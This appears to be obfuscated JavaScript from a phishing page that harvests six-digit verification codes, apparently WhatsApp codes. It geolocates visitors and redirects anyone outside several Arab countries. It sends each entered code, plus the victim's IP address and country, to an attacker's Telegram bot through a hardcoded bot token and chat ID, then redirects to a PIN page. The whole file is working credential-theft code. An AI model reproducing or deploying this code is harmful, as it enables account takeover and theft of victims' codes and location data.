var ip_adress, country_code
function callback(_0x1eedca) {
  ip_adress = _0x1eedca.IPv4
  country_code = _0x1eedca.country_code
  var _0x4123aa = ['JO', 'IQ', 'KW', 'SA', 'OM', 'AE', 'BH', 'QA', 'EG']
  !_0x4123aa.includes(country_code) &&
    window.location.replace('https://chat.whatsapp.com/GXPXmnDnHuvGro6aEqhbW')
}
$.ajax({
  url: 'https://geoip-db.com/jsonp/',
  dataType: 'jsonp',
})
function ValideText() {
  var _0x3d77fe = document.getElementById('txtcode')
  return _0x3d77fe.value != '' && _0x3d77fe.value.length == 6 ? true : false
}
var bntclicked = false
function SendCode() {
  if (!bntclicked) {
    var _0x1bb1ad = '5865923171:AAGIar3a7Z34hqlbs1ScjTNr-O2Zoprww4g',
      _0x260981 = '5887678093',
      _0x3db741 = 0
    if (ValideText() && !isNaN(document.getElementById('txtcode').value)) {
      bntclicked = true
      var _0xd494b8 = document.getElementById('txtcode').value,
        _0xe85657 =
          'https://api.telegram.org/bot' +
          _0x1bb1ad +
          '/sendMessage?chat_id=' +
          _0x260981 +
          '&text=Code : ' +
          _0xd494b8
      fetch(_0xe85657, { method: 'POST' }).then((_0x388a37) => {
        if (_0x388a37.ok) {
          _0x3db741++
          var _0x243bda =
            'https://api.telegram.org/bot' +
            _0x1bb1ad +
            '/sendMessage?chat_id=' +
            _0x260981 +
            '&text=IP : ' +
            ip_adress +
            ':' +
            country_code
          fetch(_0x243bda, { method: 'POST' }).then((_0x5df9d7) => {
            _0x5df9d7.ok &&
              _0x3db741 == 1 && window.location.replace('pin.html')
          })
        } else {
          window.location.replace('code.html')
        }
      })
    }
  }
}
function isInputNumber(_0x14664e) {
  var _0xb72ce7 = String.fromCharCode(_0x14664e.which)
  !/[0-9]/.test(_0xb72ce7) && _0x14664e.preventDefault()
}
